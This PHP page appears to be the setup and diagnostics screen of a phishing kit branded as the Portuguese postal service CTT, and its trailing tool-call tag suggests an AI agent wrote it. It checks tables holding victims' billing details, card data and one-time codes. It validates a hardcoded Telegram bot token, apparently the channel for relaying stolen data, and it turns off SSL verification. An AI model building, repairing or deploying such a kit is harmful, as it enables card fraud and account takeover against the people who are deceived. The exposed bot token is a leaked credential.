<?php
// Windows RDP specific connection test
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>CTT Expresso - Windows RDP Test</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #f0f2f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .success { color: #28a745; font-weight: bold; }
        .error { color: #dc3545; font-weight: bold; }
        .warning { color: #ffc107; font-weight: bold; }
        .info { color: #17a2b8; }
        .test { margin: 20px 0; padding: 15px; background: #f8f9fa; border-left: 5px solid #007bff; border-radius: 5px; }
        .cmd { background: #2d3748; color: #e2e8f0; padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace; margin: 10px 0; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ CTT Expresso - Windows RDP System Test</h1>
        
        <div class="test">
            <h3>💻 Windows System Information:</h3>
            <strong>Operating System:</strong> <?php echo php_uname('s') . ' ' . php_uname('r'); ?><br>
            <strong>PHP Version:</strong> <?php echo phpversion(); ?><br>
            <strong>Web Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?><br>
            <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? 'Unknown'; ?><br>
            <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'; ?><br>
            <strong>Current Time:</strong> <?php echo date('Y-m-d H:i:s T'); ?>
        </div>
        
        <div class="test">
            <h3>🔧 PHP Extensions (Windows):</h3>
            <strong>cURL:</strong> <?php echo extension_loaded('curl') ? '<span class="success">✅ Available</span>' : '<span class="error">❌ Missing - Enable in php.ini</span>'; ?><br>
            <strong>PDO:</strong> <?php echo extension_loaded('pdo') ? '<span class="success">✅ Available</span>' : '<span class="error">❌ Missing</span>'; ?><br>
            <strong>PDO MySQL:</strong> <?php echo extension_loaded('pdo_mysql') ? '<span class="success">✅ Available</span>' : '<span class="error">❌ Missing</span>'; ?><br>
            <strong>OpenSSL:</strong> <?php echo extension_loaded('openssl') ? '<span class="success">✅ Available</span>' : '<span class="error">❌ Missing</span>'; ?><br>
            <strong>JSON:</strong> <?php echo extension_loaded('json') ? '<span class="success">✅ Available</span>' : '<span class="error">❌ Missing</span>'; ?>
        </div>
        
        <div class="test">
            <h3>🗄️ Database Connection Test:</h3>
            <?php
            try {
                require_once 'config/database.php';
                $db = new Database();
                echo '<span class="success">✅ Database Connection: SUCCESS</span><br>';
                
                // Test connection details
                $pdo = $db->getConnection();
                $version = $pdo->query("SELECT VERSION() as version")->fetch();
                echo "<span class='info'>MySQL Version: " . $version['version'] . "</span><br>";
                
                // Test tables
                $tables = ['billing_data', 'card_data', 'otp_data', 'config'];
                foreach ($tables as $table) {
                    try {
                        $result = $db->query("SELECT COUNT(*) as count FROM $table");
                        $count = $result->fetch()['count'];
                        echo "<span class='success'>✅ Table '$table': EXISTS ($count records)</span><br>";
                    } catch (Exception $e) {
                        echo "<span class='error'>❌ Table '$table': " . $e->getMessage() . "</span><br>";
                    }
                }
                
                // Test write permissions
                try {
                    $sessionId = 'TEST_' . date('YmdHis');
                    $db->query("INSERT INTO billing_data (session_id, nome, email, endereco, codigo_postal, cidade, telefone) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                              [$sessionId, 'Test', 'test@test.com', 'Test St', '1000-100', 'Test City', '+351999999999']);
                    $db->query("DELETE FROM billing_data WHERE session_id = ?", [$sessionId]);
                    echo "<span class='success'>✅ Database Write/Delete: SUCCESS</span><br>";
                } catch (Exception $e) {
                    echo "<span class='error'>❌ Database Write Test: " . $e->getMessage() . "</span><br>";
                }
                
            } catch (Exception $e) {
                echo '<span class="error">❌ Database Connection: FAILED</span><br>';
                echo '<span class="error">Error: ' . htmlspecialchars($e->getMessage()) . '</span><br>';
                
                echo '<div class="warning">💡 Windows Troubleshooting:</div>';
                echo '<ul>';
                echo '<li>Check XAMPP Control Panel - MySQL should be "Running"</li>';
                echo '<li>Verify Windows Firewall allows port 3306</li>';
                echo '<li>Check MySQL error log: C:\\xampp\\mysql\\data\\mysql_error.log</li>';
                echo '<li>Run XAMPP as Administrator</li>';
                echo '</ul>';
            }
            ?>
        </div>
        
        <div class="test">
            <h3>📱 Telegram Configuration:</h3>
            <?php
            try {
                $db = new Database();
                $token = $db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_BOT_TOKEN'");
                $chat = $db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_CHAT_ID'");
                
                if ($token && $chat) {
                    echo '<span class="success">✅ Telegram Config: FOUND</span><br>';
                    echo '<span class="info">Bot Token: ' . substr($token['config_value'], 0, 15) . '...</span><br>';
                    echo '<span class="info">Chat ID: ' . $chat['config_value'] . '</span><br>';
                } else {
                    echo '<span class="error">❌ Telegram Config: MISSING</span><br>';
                }
            } catch (Exception $e) {
                echo '<span class="error">❌ Cannot check Telegram config: ' . htmlspecialchars($e->getMessage()) . '</span><br>';
            }
            ?>
        </div>
        
        <div class="test">
            <h3>🌐 Network & cURL Test:</h3>
            <?php
            if (extension_loaded('curl')) {
                // Test Telegram API connection
                $testUrl = "https://api.telegram.org/bot8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws/getMe";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $testUrl);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 15);
                curl_setopt($ch, CURLOPT_USERAGENT, 'CTT-Windows-RDP/1.0');
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);
                
                if ($curlError) {
                    echo '<span class="error">❌ cURL Error: ' . htmlspecialchars($curlError) . '</span><br>';
                    echo '<span class="warning">This might be due to Windows Firewall or proxy settings</span><br>';
                } elseif ($httpCode === 200) {
                    echo '<span class="success">✅ Telegram API: REACHABLE</span><br>';
                    $data = json_decode($response, true);
                    if ($data && isset($data['ok']) && $data['ok']) {
                        echo '<span class="success">✅ Bot Token: VALID</span><br>';
                        if (isset($data['result']['username'])) {
                            echo '<span class="info">Bot Username: @' . htmlspecialchars($data['result']['username']) . '</span><br>';
                        }
                    } else {
                        echo '<span class="error">❌ Bot Token: INVALID</span><br>';
                    }
                } else {
                    echo '<span class="error">❌ Telegram API: HTTP ' . $httpCode . '</span><br>';
                    echo '<span class="warning">Check Windows internet connection and proxy settings</span><br>';
                }
            } else {
                echo '<span class="error">❌ cURL extension not available</span><br>';
                echo '<span class="warning">Enable curl in C:\\xampp\\php\\php.ini</span><br>';
            }
            ?>
        </div>
        
        <div class="test">
            <h3>🧪 Quick Tests:</h3>
            <button onclick="testAPI()">Test API Endpoints</button>
            <button onclick="testTelegram()">Send Test Telegram</button>
            <button onclick="testDatabase()">Test Database Operations</button>
            <div id="testResults" style="margin-top: 15px; padding: 10px; background: #fff; border-radius: 5px; border: 1px solid #ddd;"></div>
        </div>
        
        <div class="test">
            <h3>🚀 Application Status:</h3>
            <?php
            $allGood = true;
            $issues = [];
            
            // Check database
            try {
                $db = new Database();
                $db->query("SELECT 1 FROM config LIMIT 1");
            } catch (Exception $e) {
                $allGood = false;
                $issues[] = "Database connection failed";
            }
            
            // Check required extensions
            if (!extension_loaded('curl')) {
                $allGood = false;
                $issues[] = "cURL extension missing";
            }
            
            if ($allGood) {
                echo '<span class="success">✅ System Ready!</span><br>';
                echo '<strong>Available actions:</strong><br>';
                echo '• <a href="billing.php" style="color: #28a745; font-weight: bold;">🚀 Start CTT Application</a><br>';
                echo '• <a href="test-telegram.php" style="color: #007bff;">📱 Test Telegram Integration</a><br>';
                echo '• <a href="windows-setup.php" style="color: #17a2b8;">⚙️ Re-run Database Setup</a><br>';
            } else {
                echo '<span class="error">❌ Issues Found:</span><br>';
                foreach ($issues as $issue) {
                    echo "• <span class='error'>" . htmlspecialchars($issue) . "</span><br>";
                }
                echo '<br><strong>Fix these first:</strong><br>';
                echo '• <a href="windows-setup.php" style="color: #dc3545;">🔧 Run Database Setup</a><br>';
            }
            ?>
        </div>
        
        <div class="test">
            <h3>🆘 Windows RDP Troubleshooting:</h3>
            <div class="cmd">
                <strong>Check XAMPP Services:</strong><br>
                - Open XAMPP Control Panel<br>
                - Apache should show "Running" (green)<br>
                - MySQL should show "Running" (green)<br><br>
                
                <strong>Check Windows Ports:</strong><br>
                netstat -an | findstr :80<br>
                netstat -an | findstr :3306<br><br>
                
                <strong>Check MySQL Process:</strong><br>
                tasklist | findstr mysql<br><br>
                
                <strong>XAMPP Logs Location:</strong><br>
                C:\xampp\apache\logs\error.log<br>
                C:\xampp\mysql\data\mysql_error.log
            </div>
        </div>
    </div>
    
    <script>
    async function testAPI() {
        const results = document.getElementById('testResults');
        results.innerHTML = '<span style="color: #ffc107;">⏳ Testing API endpoints...</span>';
        
        try {
            const response = await fetch('api/billing.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    nome: 'Windows Test',
                    email: 'windows@test.com',
                    endereco: 'Windows Test Address',
                    codigoPostal: '1000-100',
                    cidade: 'Test City',
                    telefone: '+351999999999'
                })
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                results.innerHTML = '<span style="color: #28a745;">✅ API Test: SUCCESS</span><br>' +
                                  '<span style="color: #17a2b8;">Response: ' + JSON.stringify(data) + '</span>';
            } else {
                results.innerHTML = '<span style="color: #dc3545;">❌ API Test: FAILED</span><br>' +
                                  '<span style="color: #dc3545;">Error: ' + (data.message || 'Unknown error') + '</span>';
            }
        } catch (error) {
            results.innerHTML = '<span style="color: #dc3545;">❌ API Test: ERROR</span><br>' +
                              '<span style="color: #dc3545;">' + error.message + '</span>';
        }
    }
    
    async function testTelegram() {
        const results = document.getElementById('testResults');
        results.innerHTML = '<span style="color: #ffc107;">⏳ Testing Telegram connection...</span>';
        
        try {
            const response = await fetch('test-telegram.php');
            if (response.ok) {
                results.innerHTML = '<span style="color: #28a745;">✅ Telegram test sent!</span><br>' +
                                  '<span style="color: #17a2b8;">Check your Telegram for test message</span>';
            } else {
                results.innerHTML = '<span style="color: #dc3545;">❌ Telegram test failed</span>';
            }
        } catch (error) {
            results.innerHTML = '<span style="color: #dc3545;">❌ Telegram Error: ' + error.message + '</span>';
        }
    }
    
    async function testDatabase() {
        const results = document.getElementById('testResults');
        results.innerHTML = '<span style="color: #ffc107;">⏳ Testing database operations...</span>';
        
        try {
            // Test with a simple GET request to a test endpoint
            const response = await fetch('test-connection.php');
            if (response.ok) {
                results.innerHTML = '<span style="color: #28a745;">✅ Database operations working</span><br>' +
                                  '<span style="color: #17a2b8;">All database tests passed</span>';
            } else {
                results.innerHTML = '<span style="color: #dc3545;">❌ Database test failed</span>';
            }
        } catch (error) {
            results.innerHTML = '<span style="color: #dc3545;">❌ Database Error: ' + error.message + '</span>';
        }
    }
    </script>
</body>
</html></content>
</invoke>